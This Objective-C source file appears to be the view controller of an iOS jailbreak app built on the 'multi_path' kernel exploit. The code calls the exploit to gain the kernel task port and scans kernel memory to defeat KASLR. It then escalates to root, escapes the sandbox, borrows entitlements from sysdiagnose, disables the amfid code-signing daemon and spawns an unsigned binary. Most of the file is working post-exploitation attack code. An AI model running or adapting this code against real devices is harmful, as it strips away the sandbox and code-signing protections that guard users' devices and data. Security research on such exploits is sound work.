//
//  ViewController.m
//  multi_path
//
//  Created by Ian Beer on 5/28/18.
//  Copyright © 2018 Ian Beer. All rights reserved.
//

#import "ViewController.h"
#include "sploit.h"
#include "jelbrek/jelbrek.h"
#include "jelbrek/kern_utils.h"
#include "jelbrek/offsetof.h"
#include "jelbrek/patchfinder64.h"

#include <sys/stat.h>
#include <sys/spawn.h>
#include <mach/mach.h>

mach_port_t taskforpidzero;
uint64_t kernel_base, kslide;

//Jonathan Seals: https://github.com/JonathanSeals/kernelversionhacker
uint64_t find_kernel_base() {
#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS_IOS10 0xfffffff007004000
#define KERNEL_SEARCH_ADDRESS_IOS9 0xffffff8004004000
#define KERNEL_SEARCH_ADDRESS_IOS 0xffffff8000000000

#define ptrSize sizeof(uintptr_t)

uint64_t addr = KERNEL_SEARCH_ADDRESS_IOS10+MAX_KASLR_SLIDE;


while (1) {
    char *buf;
    mach_msg_type_number_t sz = 0;
    kern_return_t ret = vm_read(taskforpidzero, addr, 0x200, (vm_offset_t*)&buf, &sz);
    
    if (ret) {
        goto next;
    }
    
    if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
        int ret = vm_read(taskforpidzero, addr, 0x1000, (vm_offset_t*)&buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            goto next;
        }
        
        for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
            mach_msg_type_number_t sz;
            int ret = vm_read(taskforpidzero, i, 0x120, (vm_offset_t*)&buf, &sz);
            
            if (ret != KERN_SUCCESS) {
                printf("Failed vm_read %i\n", ret);
                exit(-1);
            }
            if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                
                printf("kernel base: 0x%llx\nkaslr slide: 0x%llx\n", addr, addr - 0xfffffff007004000);
                
                return addr;
            }
        }
    }
    
next:
    addr -= 0x200000;
}
}


@interface ViewController ()

@end

@implementation ViewController

-(void)log:(NSString*)log {
    self.logs.text = [NSString stringWithFormat:@"%@\n%@", self.logs.text, log];
}

-(void)jelbrek {
    get_root(getpid());
    empower(getpid());
    unsandbox(getpid());
    
    
    if (geteuid() == 0) {
        
        [self log:@"Success! Got root!"];
        
        FILE *f = fopen("/var/mobile/.roottest", "w");
        if (f == 0) {
            [self log:@"Failed to escape sandbox!"];
            return;
        }
        else
            [self log:[NSString stringWithFormat:@"Successfully wrote file! %p", f]];
        fclose(f);
        
    }
    else {
        [self log:@"Failed to get root!"];
        return;
    }
    
    //Jonathan Levin: http://newosxbook.com/QiLin/
    initQiLin(taskforpidzero, kernel_base);
    
    setKernelSymbol("_kernproc", find_kernproc()-kslide);
    
    platformizeMe();
    borrowEntitlementsFromDonor("/usr/bin/sysdiagnose","-u");
    castrateAmfid();
    
    NSString *testbin = [NSString stringWithFormat:@"%@/test", [[NSBundle mainBundle] bundlePath]];
    chmod([testbin UTF8String], 777);
    
    pid_t pd;
    const char* args[] = {[testbin UTF8String], NULL};
    int rv = posix_spawn(&pd, [testbin UTF8String], NULL, NULL, (char **)&args, NULL);
    [self log:(rv) ? @"Failed to patch codesign!" : @"SUCCESS! Patched codesign!"];
}
- (IBAction)go:(id)sender {
    taskforpidzero = run();
    kernel_base = find_kernel_base();
    kslide = kernel_base - 0xfffffff007004000;
    
    if (taskforpidzero != MACH_PORT_NULL) {
        [self log:@"Exploit successful!"];
        init_jelbrek(taskforpidzero, kernel_base);
        [self jelbrek];
    }
    else
        [self log:@"Exploit failed!"];
}

- (void)viewDidLoad {
  [super viewDidLoad];
  // Do any additional setup after loading the view, typically from a nib.
}


- (void)didReceiveMemoryWarning {
  [super didReceiveMemoryWarning];
  // Dispose of any resources that can be recreated.
}


@end
